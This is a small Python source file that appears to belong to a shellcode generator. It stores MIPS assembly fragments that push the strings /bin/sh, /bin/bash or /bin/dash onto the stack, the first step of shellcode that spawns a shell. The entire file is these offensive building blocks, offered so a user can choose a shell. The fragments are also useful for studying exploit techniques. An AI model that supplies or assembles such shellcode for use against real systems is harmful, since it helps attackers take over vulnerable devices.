# Load different shells in the stack, according to your taste

class Shells:
    shells_list = {

    # Load /bin/sh on the stack
    'SH': '''lui     $t7, 0x2f2f
    ori     $t7, $t7, 0x6269
    sw      $t7, -0x14($sp)
    lui     $t6, 0x6e2f
    ori     $t6, $t6, 0x7368
    sw      $t6, -0x10($sp)
    sw      $zero, -0xc($sp)''',

    # Load /bin/bash on the stack
    'BASH': '''lui     $t7, 0x2f2f
    ori     $t7, $t7, 0x6269
    sw      $t7, -0x14($sp)
    lui     $t6, 0x6e2f
    ori     $t6, $t6, 0x6261
    sw      $t6, -0x10($sp)
    lui     $t5, 0x7368
    ori     $t5, $t5, 0x0000
    sw      $t5, -0xc($sp)''',

    # Load /bin/dash on the stack
    'DASH': '''lui     $t7, 0x2f2f
    ori     $t7, $t7, 0x6269
    sw      $t7, -0x14($sp)
    lui     $t6, 0x6e2f
    ori     $t6, $t6, 0x6461
    sw      $t6, -0x10($sp)
    lui     $t5, 0x7368
    ori     $t5, $t5, 0x0000
    sw      $t5, -0xc($sp)'''
    }